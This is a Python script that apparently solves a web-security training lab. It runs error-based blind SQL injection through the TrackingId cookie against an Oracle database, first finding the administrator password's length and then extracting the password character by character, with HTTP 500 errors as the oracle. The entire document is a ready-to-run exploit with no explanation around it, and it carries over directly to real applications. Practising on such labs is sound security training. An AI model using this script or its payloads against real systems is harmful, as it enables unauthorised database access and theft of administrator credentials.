import requests

url = "https://0ad1009c034ee9d1805c0dd70022007e.web-security-academy.net/"

base_tracking_id = "ODGnpEfOIMnJuVI7"
session_cookie = "WQBNk7rJnrWtaIWv8EGYCB2Q8JPG9JaA"

def get_length():
    for i in range(3, 50):
        payload = f"'|| (SELECT CASE WHEN (length((SELECT password FROM users WHERE username='administrator'))={i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)|| '--"
        
        cookies = {
            "TrackingId": base_tracking_id + payload,
            "session": session_cookie
        }

        r = requests.get(url, cookies=cookies)

        if r.status_code==500:
            return i

    return None

charlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}:;,.?"

def get_password(length):
    password=""
    for i in range(1, length+1):
        for char in charlist:
            payload = f"'|| (SELECT CASE WHEN (SUBSTR((select password from users where username ='administrator'),{i},1)='{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)|| '-- "
            
            cookies={
                "TrackingId":base_tracking_id+payload,
                "session":session_cookie
            }
            response = requests.get(url, cookies=cookies)

            if response.status_code==500:
                password=password+char
                print(f"[*]trying--->{password}....")
                break
            
    return password


length = get_length()
print(f"[+] Password length = {length}")

if(length):
    password = get_password(length=length)
    print(f"[+]the password: {password}")

